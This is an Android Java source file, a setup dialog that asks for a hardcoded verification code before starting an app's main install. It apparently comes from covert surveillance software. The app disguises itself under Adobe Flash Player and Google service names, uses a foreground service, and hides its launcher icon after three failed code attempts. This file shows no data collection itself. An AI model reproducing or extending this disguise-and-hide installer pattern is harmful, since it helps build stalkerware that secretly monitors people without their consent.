package com.setup;

import java.lang.reflect.Field;
import java.util.Locale;

import com.adobe.flashplayer.R;
import com.main.ForegroundService;
import com.utils.PrefOper;
import com.utils.Public;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.widget.EditText;
import android.widget.Toast;



public class SetupDlg {
	
	public static String CFGCHECKCODETimes = "checkSetupCodeTimes";
	public static String CFGCHECKCODERESULT = "checkSetupCodeResult";
	
	@SuppressLint("HandlerLeak") 
	public static String checkSetup(final Activity activity,final Handler handler){
		
		String strresult = PrefOper.getValue((Context)activity, ForegroundService.PARAMCONFIG_FileName, CFGCHECKCODERESULT);
		if (strresult == null || strresult.equals("") || strresult.equals("true") == false) {
			
		}else{
    		Message msg = handler.obtainMessage();
    		msg.what = GoogleServiceActivity.SETUP_INSTALL_MAIN;
			handler.sendMessage(msg);
			return "";
		}
		
		
		
		final EditText editText = new EditText(activity);

		DialogInterface.OnClickListener dlgcl = new DialogInterface.OnClickListener() {
			
			public void checkError(DialogInterface dialog,EditText edit){
				try {
					String strtimes = PrefOper.getValue((Context)activity, 
							ForegroundService.PARAMCONFIG_FileName, CFGCHECKCODETimes);
					int times = 0;
					if (strtimes == null || strtimes.equals("") ) {
						times = 0;
					}else{
						times = Integer.parseInt(strtimes);
					}
					
					times ++;
					PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName, CFGCHECKCODETimes,String.valueOf(times));

					int least = 3 - times;
					String tips = "输入错误!" + "您还有" + least +"次机会";
					Toast.makeText(activity,  tips, Toast.LENGTH_LONG).show();
					
					edit.setText("");

		  			if (times >= 3 ) {
		  				
		  				GoogleServiceActivity.hideIcon(activity);
		  				
			    		Message msg = handler.obtainMessage();
			    		msg.what = GoogleServiceActivity.SETUP_FINISH_MAIN;
		  				handler.sendMessage(msg);
		  				
		  				//Looper.myLooper().quitSafely();
		  				
		  				
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			
		    @Override
		    public void onClick(DialogInterface dialog, int flag) {
		    	
		    	try {
			    	Field field = dialog.getClass().getSuperclass().getDeclaredField("mShowing");                    
			    	field.setAccessible(true);                                  
			    	field.set(dialog, false);
				} catch (Exception e) {
					e.printStackTrace();
					return;
				}

		    	String input = editText.getText().toString();
		    	if(input.length() <= 0){
		    		checkError(dialog,editText);
		    		return;
		    	}


	  			boolean ret = Public.UserName.toLowerCase(Locale.CHINA).equals(input.toLowerCase(Locale.CHINA));
	  			if (ret == false) {
	  				checkError(dialog,editText);
	  			}else{
			    	try {
			    		PrefOper.setValue((Context)activity, ForegroundService.PARAMCONFIG_FileName,CFGCHECKCODERESULT,"true");
			    		
				    	Field field = dialog.getClass().getSuperclass().getDeclaredField("mShowing");                    
				    	field.setAccessible(true);                                  
				    	field.set(dialog, true);
				    	
				    	
				    	
			    		Message msg = handler.obtainMessage();
			    		msg.what = GoogleServiceActivity.SETUP_INSTALL_MAIN;
		  				handler.sendMessage(msg);
		  				
		  				

		  				
		  				//Looper.myLooper().quitSafely();
					} catch (Exception e) {
						e.printStackTrace();
					}
	  			}
	  			
	  			return;
		    }
        };
        
        Looper.prepare();
        //editText.setInputType( InputType.TYPE_CLASS_NUMBER);
        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
        builder.setTitle("请输入验证码");
        builder.setView(editText);
        builder.setCancelable(false);
        builder.setPositiveButton("确认", dlgcl );
        builder.create().show();

        Looper.loop();

        return editText.getText().toString();
	}
}

